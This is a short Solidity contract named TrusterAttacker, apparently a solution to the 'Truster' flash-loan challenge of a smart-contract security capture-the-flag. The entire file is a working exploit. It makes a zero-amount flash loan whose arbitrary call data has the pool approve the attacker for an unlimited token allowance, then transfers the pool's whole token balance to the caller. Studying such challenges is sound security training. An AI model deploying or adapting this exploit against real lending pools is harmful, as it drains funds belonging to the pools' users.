// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Pool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract TrusterAttacker {
    function attack(address victim, address _token) public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        IERC20 token = IERC20(_token);
        Pool(victim).flashLoan(0, msg.sender, _token, data);

        token.transferFrom(victim, msg.sender, token.balanceOf(victim));
    }
}
